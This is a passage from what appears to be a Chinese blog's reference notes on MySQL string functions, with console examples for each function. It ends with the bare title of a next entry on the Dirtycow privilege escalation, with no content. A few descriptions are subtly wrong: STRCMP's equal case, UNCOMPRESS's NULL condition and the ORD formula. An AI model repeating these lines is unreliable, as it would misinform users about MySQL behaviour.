sec)</span><br></pre></td></tr></table></figure><hr><p>BIT_LENGTH(str)<br>返回值为二进制的字符串str 长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT BIT_LENGTH(2);</span><br><span class="line">+---------------+</span><br><span class="line">| BIT_LENGTH(2) |</span><br><span class="line">+---------------+</span><br><span class="line">|             8 |</span><br><span class="line">+---------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>CHAR(N,… [USING charset])<br>CHAR()将每个参数N理解为一个整数，其返回值为一个包含这些整数的代码值所给出的字符的字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CHAR(77,121,83,81,&apos;76&apos;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| CHAR(77,121,83,81,&apos;76&apos;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| MySQL                   |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>大于 255的CHAR()参数被转换为多结果字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT HEX(CHAR(1,0)), HEX(CHAR(256));</span><br><span class="line">+----------------+----------------+</span><br><span class="line">| HEX(CHAR(1,0)) | HEX(CHAR(256)) |</span><br><span class="line">+----------------+----------------+</span><br><span class="line">| 0100           | 0100           |</span><br><span class="line">+----------------+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>CHAR_LENGTH(str)<br>返回值为字符串str 的长度，长度的单位为字符。一个多字节字符算作一个单字符。对于一个包含五个二字节字符集, LENGTH()返回值为 10, 而CHAR_LENGTH()的返回值为5。</p><hr><p>CHARACTER_LENGTH(str)<br>CHARACTER_LENGTH()是CHAR_LENGTH()的同义词。</p><hr><p>COMPRESS(string_to_compress)<br>压缩一个字符串。这个函数要求 MySQL已经用一个诸如zlib的压缩库压缩过。 否则，返回值始终是NULL。UNCOMPRESS() 可将压缩过的字符串进行解压缩。</p><hr><p>CONCAT(str1,str2,…)返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。<br>如果自变量中含有任一二进制字符串，则结果为一个二进制字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| MySQL                   |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><hr><p>CONCAT_WS(separator,str1,str2,…)<br>第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT_WS(&apos;,&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| CONCAT_WS(&apos;,&apos;,&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| a,b,c                      |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>CONV(N,from_base,to_base)<br>不同数基间转换数字。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CONV(2,10,2);</span><br><span class="line">+--------------+</span><br><span class="line">| CONV(2,10,2) |</span><br><span class="line">+--------------+</span><br><span class="line">| 10           |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><hr><p>ELT(N,str1,str2,str3,…)若N = 1，则返回值为 str1 ，若N = 2，则返回值为 str2。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT ELT(3, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| ELT(3, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| 3                          |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><hr><p>EXPORT_SET(bits,on,off[,separator[,number_of_bits]])<br>比特操作字符串</p><hr><p>FIELD(str,str1,str2,str3,…)<br>返回值为str1, str2, str3,……列表中的str的位置。</p><hr><p>HEX(N_or_S)如果N_OR_S 是一个数字，则返回一个 十六进制值 N 的字符串表示，在这里， N 是一个longlong (BIGINT)数。这相当于 CONV(N,10,16)。如果N_OR_S 是一个字符串，则返回值为一个N_OR_S的十六进制字符串表示</p><hr><p>INSERT(str,pos,len,newstr)返回字符串 str, 其子字符串起始于 pos 位置和长期被字符串 newstr取代的len 字符。 如果pos 超过字符串长度，则返回值为原始字符串。 假如len的长度大于其它字符串的长度，则从位置pos开始替换。若任何一个参数为null，则返回值为NULL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT INSERT(&apos;123456789&apos;, 3, 4, &apos;00&apos;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| INSERT(&apos;123456789&apos;, 3, 4, &apos;00&apos;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| 1200789                         |</span><br><span class="line">+---------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>INSTR(str,substr)返回字符串 str 中子字符串的第一个出现位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT INSTR(&apos;123456&apos;, &apos;56&apos;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| INSTR(&apos;123456&apos;, &apos;56&apos;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     5 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>LCASE(str)LCASE() 是 LOWER()的同义词。</p><hr><p>LEFT(str,len)返回从字符串str 开始的len 最左字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT LEFT(&apos;123456789&apos;, 5);</span><br><span class="line">+----------------------+</span><br><span class="line">| LEFT(&apos;123456789&apos;, 5) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 12345                |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>LENGTH(str)返回值为字符串str 的长度，单位为字节。一个多字节字符算作多字节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT LENGTH(&apos;12345&apos;);</span><br><span class="line">+-----------------+</span><br><span class="line">| LENGTH(&apos;12345&apos;) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               5 |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT LENGTH(&apos;你好&apos;);</span><br><span class="line">+----------------+</span><br><span class="line">| LENGTH(&apos;你好&apos;) |</span><br><span class="line">+----------------+</span><br><span class="line">|              4 |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>LOAD_FILE(file_name)读取文件并将这一文件按照字符串的格式返回。</p><ul><li>文件的位置必须在服务器上,</li><li>你必须为文件制定路径全名，</li><li>而且你还必须拥有FILE 特许权。</li><li>文件必须可读取，</li><li>文件容量必须小于 max_allowed_packet字节。<br>若文件不存在，或因不满足上述条件而不能被读取， 则函数返回值为 NULL。</li></ul><hr><p>LOCATE(substr,str) , LOCATE(substr,str,pos)第一个语法返回字符串 str中子字符串substr的第一个出现位置。第二个语法返回返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如若substr 不在str中，则返回值为0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT LOCATE(&apos;456&apos;, &apos;123456456&apos;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| LOCATE(&apos;456&apos;, &apos;123456456&apos;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          4 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT LOCATE(&apos;456&apos;, &apos;123456456&apos;, 5);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| LOCATE(&apos;456&apos;, &apos;123456456&apos;, 5) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                             7 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>LOWER(str)返回字符串 str 以及所有根据最新的字符集映射表变为小写字母的字符</p><hr><p>LPAD(str,len,padstr)返回字符串 str, 其左边由字符串padstr 填补到len 字符长度。假如str 的长度大于len, 则返回值被缩短至 len 字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT LPAD(&apos;123&apos;,4,&apos;0&apos;);</span><br><span class="line">+-------------------+</span><br><span class="line">| LPAD(&apos;123&apos;,4,&apos;0&apos;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 0123              |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT LPAD(&apos;123&apos;,2,&apos;0&apos;);</span><br><span class="line">+-------------------+</span><br><span class="line">| LPAD(&apos;123&apos;,2,&apos;0&apos;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 12                |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>LTRIM(str)返回字符串 str ，其引导空格字符被删除。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT LTRIM(&apos;  0 0  &apos;);</span><br><span class="line">+------------------+</span><br><span class="line">| LTRIM(&apos;  0 0  &apos;) |</span><br><span class="line">+------------------+</span><br><span class="line">| 0 0              |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT LENGTH(LTRIM(&apos;  0 0  &apos;));</span><br><span class="line">+--------------------------+</span><br><span class="line">| LENGTH(LTRIM(&apos;  0 0  &apos;)) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        5 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>MAKE_SET(bits,str1,str2,…)返回一个设定值 (一个包含被‘,’号分开的字字符串的字符串) ，由在bits 组中具有相应的比特的字符串组成。str1 对应比特 0, str2 对应比特1,以此类推。str1, str2, …中的 NULL值不会被添加到结果中。</p><hr><p>MID(str,pos,len)MID(str,pos,len) 是 SUBSTRING(str,pos,len)的同义词。</p><hr><p>OCT(N)返回一个 N的八进制值的字符串表示，其中 N 是一个longlong (BIGINT)数。这等同于CONV(N,10,8)。若N 为 NULL ，则返回值为NULL。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT OCT(8);</span><br><span class="line">+--------+</span><br><span class="line">| OCT(8) |</span><br><span class="line">+--------+</span><br><span class="line">| 10     |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>OCTET_LENGTH(str)OCTET_LENGTH() 是 LENGTH()的同义词。</p><hr><p>ORD(str)若字符串str 的最左字符是一个多字节字符，则返回该字符的代码， 代码的计算通过使用以下公式计算其组成字节的数值而得出:(1st byte code)(2nd byte code × 256)(3rd byte code × 2562) …假如最左字符不是一个多字节字符，那么 ORD()和函数ASCII()返回相同的值。</p><hr><p>POSITION(substr IN str)POSITION(substr IN str)是 LOCATE(substr,str)同义词。</p><hr><p>QUOTE(str)引证一个字符串，由此产生一个在SQL语句中可用作完全转义数据值的结果。 返回的字符串由单引号标注，每例都带有单引号 (‘’’)、 反斜线符号 (‘\’)、 ASCII NUL以及前面有反斜线符号的Control-Z 。如果自变量的值为NULL, 则返回不带单引号的单词 “NULL”。</p><hr><p>REPEAT(str,count)返回一个由重复的字符串str 组成的字符串，字符串str的数目等于count 。 若 count &lt;= 0,则返回一个空字符串。若str 或 count 为 NULL，则返回 NULL 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT REPEAT(&apos;123&apos;, 3);</span><br><span class="line">+------------------+</span><br><span class="line">| REPEAT(&apos;123&apos;, 3) |</span><br><span class="line">+------------------+</span><br><span class="line">| 123123123        |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>REPLACE(str,from_str,to_str)返回字符串str 以及所有被字符串to_str替代的字符串from_str 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT REPLACE(&apos;101010101&apos;, &apos;0&apos;, &apos;2&apos;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| REPLACE(&apos;101010101&apos;, &apos;0&apos;, &apos;2&apos;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 121212121                      |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>REVERSE(str)返回字符串 str ，顺序和字符顺序相反。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT REVERSE(&apos;12345&apos;);</span><br><span class="line">+------------------+</span><br><span class="line">| REVERSE(&apos;12345&apos;) |</span><br><span class="line">+------------------+</span><br><span class="line">| 54321            |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>RIGHT(str,len)从字符串str 开始，返回最右len 字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT RIGHT(&apos;12345678&apos;, 4);</span><br><span class="line">+----------------------+</span><br><span class="line">| RIGHT(&apos;12345678&apos;, 4) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 5678                 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>RPAD(str,len,padstr)返回字符串str, 其右边被字符串 padstr填补至len 字符长度。假如字符串str 的长度大于 len,则返回值被缩短到与 len 字符相同长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT RPAD(&apos;123&apos;,5,&apos;0&apos;);</span><br><span class="line">+-------------------+</span><br><span class="line">| RPAD(&apos;123&apos;,5,&apos;0&apos;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 12300             |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>RTRIM(str)返回字符串 str ，结尾空格字符被删去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT RTRIM(&apos;123   &apos;);</span><br><span class="line">+-----------------+</span><br><span class="line">| RTRIM(&apos;123   &apos;) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 123             |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>SOUNDEX(str)从str返回一个soundex字符串。 两个具有几乎同样探测的字符串应该具有同样的 soundex 字符串。一个标准的soundex 字符串的长度为4个字符，然而SOUNDEX() 函数会返回一个人以长度的字符串。 可使用结果中的SUBSTRING() 来得到一个标准 soundex 字符串。在str中，会忽略所有未按照字母顺序排列的字符。 所有不在A-Z范围之内的国际字母符号被视为元音字母。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT SOUNDEX(&apos;Hello&apos;);</span><br><span class="line">  -&gt; &apos;H400&apos;</span><br><span class="line">mysql&gt; SELECT SOUNDEX(&apos;Quadratically&apos;);</span><br><span class="line">  -&gt; &apos;Q36324&apos;</span><br></pre></td></tr></table></figure><hr><p>expr1 SOUNDS LIKE expr2这相当于SOUNDEX(expr1) = SOUNDEX(expr2)。</p><hr><p>SPACE(N)返回一个由N 间隔符号组成的字符串。<br>两个空格<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT SPACE(2);</span><br><span class="line">+----------+</span><br><span class="line">| SPACE(2) |</span><br><span class="line">+----------+</span><br><span class="line">|          |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><hr><p>SUBSTRING(str,pos) , SUBSTRING(str FROM pos) SUBSTRING(str,pos,len) , SUBSTRING(str FROM pos FOR len)不带有len 参数的格式从字符串str返回一个子字符串，起始于位置 pos。带有len参数的格式从字符串str返回一个长度同len字符相同的子字符串，起始于位置 pos。 使用 FROM的格式为标准 SQL 语法。也可能对pos使用一个负值。假若这样，则子字符串的位置起始于字符串结尾的pos 字符，而不是字符串的开头位置。在以下格式的函数中可以对pos 使用一个负值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT SUBSTRING(&apos;Quadratically&apos;,5);</span><br><span class="line">  -&gt; &apos;ratically&apos;</span><br><span class="line">mysql&gt; SELECT SUBSTRING(&apos;foobarbar&apos; FROM 4);</span><br><span class="line">  -&gt; &apos;barbar&apos;</span><br><span class="line">mysql&gt; SELECT SUBSTRING(&apos;Quadratically&apos;,5,6);</span><br><span class="line">  -&gt; &apos;ratica&apos;</span><br><span class="line">mysql&gt; SELECT SUBSTRING(&apos;Sakila&apos;, -3);</span><br><span class="line">  -&gt; &apos;ila&apos;</span><br><span class="line">mysql&gt; SELECT SUBSTRING(&apos;Sakila&apos;, -5, 3);</span><br><span class="line">  -&gt; &apos;aki&apos;</span><br><span class="line">mysql&gt; SELECT SUBSTRING(&apos;Sakila&apos; FROM -4 FOR 2);</span><br><span class="line">  -&gt; &apos;ki&apos;</span><br></pre></td></tr></table></figure><hr><p>SUBSTR()是 SUBSTRING()的同义词。</p><hr><p>SUBSTRING_INDEX(str,delim,count)在定界符 delim 以及count 出现前，从字符串str返回自字符串。若count为正值,则返回最终定界符(从左边开始)左边的一切内容。若count为负值，则返回定界符（从右边开始）右边的一切内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, 2);</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, 2) |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| www.baidu                                |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM] str) TRIM(remstr FROM] str)返回字符串 str ， 其中所有remstr 前缀和/或后缀都已被删除。若分类符BOTH、LEADIN或TRAILING中没有一个是给定的,则假设为BOTH 。 remstr 为可选项，在未指定情况下，可删除空格。</p><hr><p>UCASE(str)UCASE()是UPPER()的同义词。</p><hr><p>UNCOMPRESS(string_to_uncompress)对经COMPRESS()函数压缩后的字符串进行解压缩。若参数为压缩值，则结果为 NULL。这个函数要求 MySQL 已被诸如zlib 之类的压缩库编译过。否则, 返回值将始终是 NULL。</p><hr><p>UNCOMPRESSED_LENGTH(compressed_string)返回压缩字符串压缩前的长度。</p><hr><p>UNHEX(str)执行从HEX(str)的反向操作。就是说，它将参数中的每一对十六进制数字理解为一个数字，并将其转化为该数字代表的字符。结果字符以二进制字符串的形式返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(&quot;asdf&quot;);</span><br><span class="line">+-------------+</span><br><span class="line">| hex(&quot;asdf&quot;) |</span><br><span class="line">+-------------+</span><br><span class="line">| 61736466    |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(&quot;61736466&quot;);</span><br><span class="line">+-------------------+</span><br><span class="line">| unhex(&quot;61736466&quot;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| asdf              |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>UPPER(str)返回字符串str， 以及根据最新字符集映射转化为大写字母的字符</p><hr><p>STRCMP(expr1,expr2)若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT STRCMP(&apos;123456&apos;, &apos;12345&apos;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| STRCMP(&apos;123456&apos;, &apos;12345&apos;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                         1 |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT STRCMP(&apos;123456&apos;, &apos;123456&apos;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| STRCMP(&apos;123456&apos;, &apos;123456&apos;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          0 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT STRCMP(&apos;12345&apos;, &apos;123456&apos;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| STRCMP(&apos;12345&apos;, &apos;123456&apos;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">|                        -1 |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><hr><p>被零除的结果为 NULL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1/0;</span><br><span class="line">+------+</span><br><span class="line">| 1/0  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> web </category>
          
          <category> sql函数简记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql函数简记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Dirtycow 提权</title>
      <link href="/2016/10/30/%E6%8F%90%E6%9D%83%E5%90%8E%E9%97%A8/dirtycow%E6%8F%90%E6%9D%83/"/>
      <url>/2016/10/30/%E6%8F%90%E6%9D%83%E5%90%8E%E9%97%A8/dirtycow%E6%8F%90%E6%9D%83/</url>
